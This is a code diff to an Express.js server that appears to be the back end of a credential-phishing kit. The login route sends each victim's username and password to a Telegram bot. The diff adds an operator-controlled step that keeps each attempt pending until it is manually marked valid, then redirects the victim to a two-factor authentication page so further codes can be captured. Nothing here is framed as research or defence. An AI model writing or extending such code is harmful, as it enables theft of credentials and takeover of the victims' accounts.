@@ -60,7 +60,7 @@ app.get('/loadcss', (req, res) => {
 app.post('/login', (req, res) => {
   const { username, password } = req.body;
   const loginId = Date.now().toString();
-  pendingLogins[loginId] = { username, password, resolved: true, valid: false }; // Always set to invalid
+  pendingLogins[loginId] = { username, password, resolved: false };
   
   // Send login details to Telegram bot
   sendToTelegram(`Login Attempt:\nUsername: ${username}\nPassword: ${password}`)
@@ -79,10 +79,11 @@ app.get('/check-login-status/:loginId', (req, res) => {
   
   if (!login) {
     res.status(404).json({ message: 'Login attempt not found' });
-  } else {
-    // Always return invalid login and redirect to original page
-    res.status(200).json({ message: 'invalid', redirect: '/' });
+  } else if (login.resolved) {
+    res.status(200).json({ message: login.valid ? 'valid' : 'invalid', redirect: login.valid ? '/two-factor-authentication' : '/' });
     delete pendingLogins[loginId];
+  } else {
+    res.status(202).json({ message: 'pending' });
   }
 });
 
@@ -96,9 +97,8 @@ app.get('/pending-logins', (req, res) => {
 app.post('/resolve-login', (req, res) => {
   const { loginId, valid } = req.body;
   if (pendingLogins[loginId]) {
-    // Always set to invalid
     pendingLogins[loginId].resolved = true;
-    pendingLogins[loginId].valid = false;
+    pendingLogins[loginId].valid = valid;
     res.status(200).json({ message: 'Login resolved' });
   } else {
     res.status(404).json({ message: 'Login attempt not found' });
